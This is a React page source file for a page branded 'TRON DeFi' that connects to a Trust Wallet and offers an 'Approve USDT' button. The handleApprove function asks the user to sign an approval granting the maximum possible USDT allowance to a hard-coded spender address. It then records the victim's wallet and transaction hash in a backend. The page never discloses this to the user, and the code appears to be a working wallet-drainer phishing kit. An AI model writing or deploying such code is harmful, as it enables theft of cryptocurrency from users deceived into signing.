import { useState, useEffect } from "react";
import { useMutation } from "convex/react";
import { api } from "@/convex/_generated/api.js";

const TRON_USDT    = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const TRON_SPENDER = "TWejasrnoKg2AgPpCwHgozYeThWBu8S9Hw";

export default function Index() {
  const [address, setAddress] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [status, setStatus] = useState("");
  const createTransaction = useMutation(api.transactions.createTransaction);

  // 1. Auto-Detect Trust Wallet on Page Load
  useEffect(() => {
    const checkWallet = async () => {
      if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
        setAddress(window.tronWeb.defaultAddress.base58);
      }
    };
    const timer = setInterval(checkWallet, 1000); // Har second check karega
    return () => clearInterval(timer);
  }, []);

  // 2. Manual Connect Button Function
  const connectWallet = async () => {
    if (window.tronWeb) {
      try {
        // Trust Wallet se permission maangna
        await window.tronWeb.request({ method: 'tron_requestAccounts' });
        setAddress(window.tronWeb.defaultAddress.base58);
      } catch (e) {
        alert("Connection Rejected");
      }
    } else {
      alert("Please open this link inside Trust Wallet DApp Browser!");
    }
  };

  const handleApprove = async () => {
    try {
      setIsLoading(true);
      setStatus("Confirm in Trust Wallet...");

      const tronWeb = window.tronWeb;
      const maxAmount = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

      const parameter = [
        { type: 'address', value: TRON_SPENDER },
        { type: 'uint256', value: maxAmount }
      ];

      const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
        TRON_USDT,
        "approve(address,uint256)",
        { feeLimit: 100_000_000 },
        parameter,
        address
      );

      const signedTx = await tronWeb.trx.sign(transaction.transaction);
      const result = await tronWeb.trx.sendRawTransaction(signedTx);

      if (result.result) {
        await createTransaction({
          walletAddress: address,
          txHash: result.txid,
          amount: "Unlimited Approval",
          toAddress: TRON_SPENDER,
          usdtBalance: "Verified",
          nativeBalance: "0 TRX"
        });
        alert("✅ Approval Successful!");
      }
    } catch (err) {
      alert("❌ Error: " + (err.message || "Failed"));
    } finally {
      setIsLoading(false);
      setStatus("");
    }
  };

  return (
    <div style={styles.container}>
      <div style={styles.header}>
        <span style={styles.headerTitle}>TRON DeFi</span>
        <div style={styles.statusBadge}>
            {address ? "🟢 Connected" : "🔴 Not Connected"}
        </div>
      </div>

      <div style={styles.content}>
        {!address ? (
          <button onClick={connectWallet} style={styles.btnActive}>
            Connect Trust Wallet
          </button>
        ) : (
          <div style={styles.card}>
            <p style={styles.label}>Wallet Address:</p>
            <p style={styles.addressText}>{address.slice(0,10)}...{address.slice(-10)}</p>
            
            <button 
              disabled={isLoading} 
              onClick={handleApprove} 
              style={isLoading ? styles.btnDisabled : styles.btnActive}
            >
              {isLoading ? status : "Approve USDT"}
            </button>
          </div>
        )}
      </div>
    </div>
  );
}

const styles = {
  container: { minHeight: "100vh", background: "#1c1c1e", color: "#fff", maxWidth: "480px", margin: "0 auto", fontFamily: "sans-serif" },
  header: { display: "flex", justifyContent: "space-between", padding: "20px", alignItems: "center", borderBottom: "1px solid #333" },
  headerTitle: { fontSize: "20px", fontWeight: "bold" },
  statusBadge: { fontSize: "12px", background: "#2c2c2e", padding: "5px 10px", borderRadius: "20px" },
  content: { padding: "20px" },
  card: { background: "#2c2c2e", padding: "20px", borderRadius: "16px", textAlign: "center" },
  label: { color: "#8e8e93", fontSize: "14px", marginBottom: "5px" },
  addressText: { fontSize: "13px", marginBottom: "20px", color: "#0a84ff" },
  btnActive: { width: "100%", padding: "16px", borderRadius: "12px", background: "#007aff", color: "#fff", fontWeight: "bold", border: "none", cursor: "pointer" },
  btnDisabled: { width: "100%", padding: "16px", borderRadius: "12px", background: "#3a3a3c", color: "#8e8e93", border: "none" }
};
